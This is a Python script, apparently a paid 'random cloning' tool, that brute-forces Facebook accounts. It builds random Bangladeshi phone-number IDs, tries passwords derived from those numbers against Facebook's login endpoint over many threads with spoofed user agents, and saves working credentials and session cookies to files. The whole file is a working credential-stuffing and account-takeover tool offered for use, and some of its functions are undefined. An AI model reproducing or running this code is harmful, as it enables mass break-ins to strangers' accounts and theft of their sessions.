from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
    os.system('git pull')
    os.system('pkg install curl')
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
R = '\033[31;1m'
RED = '\x1b[38;5;46m'
G = '\033[32;1m'
Y = '\033[33;1m'
B = '\033[34;1m'
M = '\033[35;1m'
C = '\033[36;1m'
R = '{RED}' 
LR = '\033[91;1m'
LG = '\033[92;1m'
LY = '\033[93;1m'
LB = '\033[94;1m'
LM = '\033[95;1m'
LC = '\033[96;1m'
dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 7_0; Win64; x64) AppleWebKit/579.38 (KHTML, like Gecko) Chrome/107.0.2185 Safari/537.36;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen=[]
ugen=[]
for tg in range(1000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,116)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ua=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ua)

nka = ["NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",]

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

  
logo=(f""" 
\033[1;97m      888b     d888 8888888b.  888b     d888 
\033[1;32m      8888b   d8888 888   Y88b 8888b   d8888 
\033[1;97m      88888b.d88888 888    888 88888b.d88888 
\033[1;32m      888Y88888P888 888   d88P 888Y88888P888 
\033[1;32m      888 Y888P 888 8888888P"  888 Y888P 888 
 \033[1;97m     888  Y8P  888 888 T88b   888  Y8P  888 
\033[1;32m      888   "   888 888  T88b  888   "   888 
\033[1;97m      888       888 888   T88b 888       888                                                                                                               
\033[1;32m ╔═════════════════════════════════════════════════╗
\033[1;32m  FACEBOK    : \033[1;32mMR.MRM
\033[1;32m  VERSION    : \033[1;32m2.3
\033[1;32m  TOOLS      : \033[1;32mRANDOM CLONING
\033[1;32m  TYPE       : \033[1;32mPAID
\033[1;32m  (✓) MRM NOT NAME MRM IS BRAND OKY (✓)
\033[1;32m ╚═════════════════════════════════════════════════╝""")
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
def Main():
	os.system('clear')
	print(logo)
	print('\033[1;32m ╔═════════════════════════════════════════════════╗')
	print("  [\033[1;32m01\33[1;92m]\033[1;93m\33[1;92m START RANDOM CLONING")
	print("  [\033[1;32m02\33[1;92m]\033[1;93m\33[1;92m START FILE CLONING")
	#print("  [\033[1;35m03\33[1;92m] FOLLOW MY FB PAGE")
	print("  [\033[1;32m03\33[1;92m]\033[1;93m\33[1;92m FOLLOW MY FB PROFILE")
	print("  [\033[1;32m04\33[1;92m]\033[1;93m\33[1;92m JOIN WHATSAPP  GROUP")
	print('  [\033[1;32m00\33[1;92m]\033[1;93m\33[1;92m EXIT PROGRAMMING')
	print('\033[1;32m ╚═════════════════════════════════════════════════╝')
	print('\033[1;32m ╔═════════════════════════════════════════════════╗')
	opt = input('  Choose option >>> ')
	print('\033[1;32m ╚═════════════════════════════════════════════════╝')
	if opt in ["A","1"]:
		virusA()
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100090880267428');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://m.me/j/Abbv1pxhte5LtTdH/');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
		
	else:
		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
		Main()
		
def virusA():
	user=[]
	os.system('clear')
	print(logo)
	print('\033[1;32m ╔════════════════════════════════════════════════╗')
	print("  BD SIM CODE : 017, 015, 018, 019, 013, 015, 016]")
	print('\033[1;32m ╚════════════════════════════════════════════════╝')
	print('\033[1;32m ╔════════════════════════════════════════════════╗')
	print("  INDIN SIM CODE : +91639,+91637,+91720,+91910]")
	print('\033[1;32m ╚════════════════════════════════════════════════╝')
	print('\033[1;32m ╔════════════════════════════════════════════════╗')
	kode = input('  SELECT : ')
	print('\033[1;32m ╚════════════════════════════════════════════════╝')
	doamin = 'BD Number id cloner [ONLY-OK] '
	print('\033[1;32m ╔════════════════════════════════════════════════╗')
	print('  EXAMPLE : 1000,5000,10000,15000,50000] ')
	print('\033[1;32m ╚════════════════════════════════════════════════╝')
	print('\033[1;32m ╔════════════════════════════════════════════════╗')
	limit = int(input('  LIMIT : '))
	print('\033[1;32m ╚════════════════════════════════════════════════╝')
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=60) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\033[1;32m ╔════════════════════════════════════════════════╗')
		print('\033[1;32m  COUNTRY    : Bangladesh')
		print('\033[1;32m  TOTAL ID   : '+tl)
		print(f'  SIM CODE   : \033[1;32m {kode} ')
		print('\033[1;32m  START BD MIXED IDS CRACKING ')
		print('\033[1;32m ╚════════════════════════════════════════════════╝')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode]
			yaari.submit(b,uid,pwx,tl)
	print('\033[1;32m╔═══════════════════════════════════════════╗')
	print('\033[1;32m        [💉] Crack process has been completed')
	print('\033[1;32m        [💉] Ids saved in ok.txt,cp.txt')
	print('\033[1;32m      ╚═══════════════════════════════════════════╝')
	exit()
##-----------LOCK REMOVE---------## 
import requests


def lock(uid):
        req = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
        if 'Photoshop' in req:
            return 'Active'
        else:
            return 'Locked'


uid = ""
status= lock(uid)
if "Active" in status:
    print ("ok id ")
def b(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write('\r\33[/[%s\33[38;5;46m]\033[38;5;46m-\033[38;5;46m%s'%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'p.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://mbasic.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'none',
            "sec-fetch-user": '?1',
            "upgrade-insecure-requests": '1',
            "user-agent": 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[65:80]
                print('\033[38;5;46m[MRM-OK] ' +uid+ '|' +ps+    '  \n\033[1;33mCOOKIES : \033[1;97m'+coki+ ' ')
         #       cek_apk(session,coki)                
                open('/sdcard/MRM-COOKIE.txt','a').write(uid+'|'+ps+ ' | ' +coki+'\n')
                open('/sdcard/MRM-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
        #        print('\033[38;5;46m[MRM-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/MRM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\33[/[%s\33[38;5;46m]\033[38;5;46m-\033[38;5;46m%s'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
